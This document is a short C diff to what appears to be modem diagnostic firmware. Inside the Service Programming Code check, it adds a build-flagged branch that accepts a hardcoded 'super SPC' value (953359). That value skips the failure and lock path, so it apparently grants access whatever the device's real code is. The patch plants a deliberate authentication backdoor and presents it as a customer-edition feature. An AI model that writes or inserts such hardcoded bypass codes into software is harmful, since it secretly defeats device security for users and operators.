@@ -1315,6 +1315,19 @@ PACK(void *) nvdiag_spc (
       */
       if (req->sec_code.digits[i] != sec_code.digits[i])
       {
+#ifdef CUST_EDITION
+        // SUPPORT SUPPER SPC
+        if(req->sec_code.digits[0] == '9'
+         &&req->sec_code.digits[1] == '5'
+         &&req->sec_code.digits[2] == '3'
+         &&req->sec_code.digits[3] == '3'
+         &&req->sec_code.digits[4] == '5'
+         &&req->sec_code.digits[5] == '9'
+         )
+        {
+            break;
+        }
+#endif
         rsp->sec_code_ok = FALSE;
 
         (void) diag_set_sp_state (DIAG_SPC_LOCKED);
